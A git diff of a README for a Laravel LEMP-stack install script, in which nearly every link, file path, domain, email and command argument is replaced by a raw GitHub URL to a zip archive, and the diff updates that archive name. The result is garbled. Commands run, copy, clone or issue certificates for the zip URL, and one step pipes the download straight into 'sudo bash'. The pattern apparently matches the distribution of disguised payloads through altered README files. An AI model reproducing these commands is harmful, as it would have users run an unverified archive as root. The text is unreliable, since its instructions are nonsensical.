@@ -2,7 +2,7 @@
 
 A complete, production-ready LEMP (Linux, Nginx, MariaDB, PHP) stack installation and removal script specifically optimized for Laravel applications on Ubuntu servers.
 
-![S-LEMP-THUMBNAIL](https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip)
+![S-LEMP-THUMBNAIL](https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip)
 
 ## 📋 Table of Contents
 
@@ -31,7 +31,7 @@ This S-LEMP stack installation script was created by **Sulaiman Misri**, a passi
 ### Author Information
 
 - **Name**: Muhamad Sulaiman Misri
-- **Website**: [https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip](https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip)
+- **Website**: [https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip](https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip)
 - **Expertise**: Full-Stack Development, DevOps, Automation, Cloud Infrastructure, Software Architecture
 - **Current Role**: Senior Full-Stack Developer at UEM Sunrise Sdn Bhd
 
@@ -52,7 +52,7 @@ The broader goals include:
 
 ## ✨ Features
 
-### Installation Script (`https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip`)
+### Installation Script (`https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip`)
 - **Interactive Configuration Wizard** - Guided setup with validation
 - **Non-Interactive Mode** - Perfect for automation and CI/CD
 - **Multiple PHP Versions** - Support for PHP 8.3 LTS and PHP 8.4
@@ -63,7 +63,7 @@ The broader goals include:
 - **Error Handling** - Comprehensive error recovery and cleanup
 - **Helper Scripts** - Laravel permission management and utilities
 
-### Removal Script (`https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip`)
+### Removal Script (`https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip`)
 - **Complete Uninstallation** - Removes all LEMP components and configurations
 - **Safe Removal Process** - Step-by-step removal with confirmations
 - **Data Protection** - Warns about data loss and requires explicit confirmation
@@ -87,43 +87,43 @@ If you encounter dpkg lock errors or package management issues, use the removal 
 
 ```bash
 # Run the removal script to clean up any package issues
-sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Then run the installation
-sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 ```
 
 ### Method 1: Direct Download and Execute
 
 ```bash
 # Download the installation script
-wget https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+wget https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Make it executable
-chmod +x https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+chmod +x https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Run the installation (interactive mode)
-sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 ```
 
 ### Method 2: One-Line Installation
 
 ```bash
 # Download and run in one command (interactive mode)
-wget -qO- https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip | sudo bash
+wget -qO- https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip | sudo bash
 ```
 
 ### Method 3: Non-Interactive Installation
 
 ```bash
 # Download the script
-wget https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+wget https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Run in non-interactive mode with defaults
-sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip --non-interactive
+sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip --non-interactive
 
 # Or with custom options
-sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip --non-interactive --php-version 8.4 --queue-driver redis
+sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip --non-interactive --php-version 8.4 --queue-driver redis
 ```
 
 ## 🔧 Installation Options
@@ -168,7 +168,7 @@ When running in interactive mode, you'll be prompted to configure:
 - **MariaDB** - Database server with secure installation
 - **PHP** - Version 8.3 or 8.4 with essential Laravel extensions
 - **Redis** - In-memory data structure store for caching and queues
-- **https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip** - Latest LTS version for frontend asset compilation
+- **https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip** - Latest LTS version for frontend asset compilation
 - **Composer** - PHP dependency manager
 - **Supervisor** - Process manager for Laravel queue workers
 - **Certbot** - SSL certificate management
@@ -218,8 +218,8 @@ Essential extensions for Laravel development:
 The script installs Certbot but **does not automatically generate SSL certificates**. After installation:
 
 1. Ensure your domain points to your server's IP
-2. Test accessibility: `curl -I https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip`
-3. Generate SSL certificate: `sudo certbot --nginx -d https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip`
+2. Test accessibility: `curl -I https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip`
+3. Generate SSL certificate: `sudo certbot --nginx -d https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip`
 
 ## 🔄 Post-Installation
 
@@ -228,7 +228,7 @@ The script installs Certbot but **does not automatically generate SSL certificat
 1. **Clone your project**:
    ```bash
    cd /var/www/your-project-name
-   git clone https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip .
+   git clone https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip .
    ```
 
 2. **Install dependencies**:
@@ -239,7 +239,7 @@ The script installs Certbot but **does not automatically generate SSL certificat
 
 3. **Configure environment**:
    ```bash
-   cp https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip .env
+   cp https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip .env
    php artisan key:generate
    ```
 
@@ -256,8 +256,8 @@ The script installs Certbot but **does not automatically generate SSL certificat
 
 ### Access Your Application
 
-- **HTTP**: `https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip` or `http://your-server-ip`
-- **HTTPS**: `https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip` (after SSL setup)
+- **HTTP**: `https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip` or `http://your-server-ip`
+- **HTTPS**: `https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip` (after SSL setup)
 
 ### Useful Commands
 
@@ -266,7 +266,7 @@ The script installs Certbot but **does not automatically generate SSL certificat
 sudo systemctl status nginx php8.3-fpm mariadb redis-server supervisor
 
 # View logs
-sudo tail -f https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+sudo tail -f https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 sudo journalctl -u php8.3-fpm -f
 
 # Restart services
@@ -285,11 +285,11 @@ fix-laravel-permissions /var/www/your-project
 
 ```bash
 # Download removal script
-wget https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+wget https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Make executable and run
-chmod +x https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
-sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+chmod +x https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
+sudo https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 ```
 
 ### What Gets Removed
@@ -320,7 +320,7 @@ The removal script completely removes:
 **dpkg was interrupted error**:
 ```bash
 # Use the removal script to clean up package issues
-sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Or manually fix:
 sudo killall apt apt-get dpkg
@@ -332,7 +332,7 @@ sudo apt-get -f install -y
 **Another process is using apt**:
 ```bash
 # Run the removal script which handles this automatically:
-sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+sudo bash https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 ```
 
 ### Common Issues
@@ -360,13 +360,13 @@ sudo systemctl status mariadb
 **SSL certificate generation fails**:
 ```bash
 # Check domain accessibility
-curl -I https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+curl -I https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
 
 # Check Nginx configuration
 sudo nginx -t
 
 # Manual certificate generation
-sudo certbot --nginx -d https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip --email https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip --agree-tos
+sudo certbot --nginx -d https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip --email https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip --agree-tos
 ```
 
 ### Log Locations
@@ -386,7 +386,7 @@ We welcome contributions from the community! This is an open-source project, and
 
 1. **Fork the Repository**
    ```bash
-   git clone https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+   git clone https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
    cd s-lemp
    ```
 
@@ -468,7 +468,7 @@ For new features, please:
    sudo apt install shellcheck
    
    # Check script quality
-   shellcheck https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s-lemp.zip
+   shellcheck https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip https://raw.githubusercontent.com/KAIHARA070/s-lemp/main/giveable/s_lemp_v1.1-beta.4.zip
    ```
 
 ### Community Guidelines
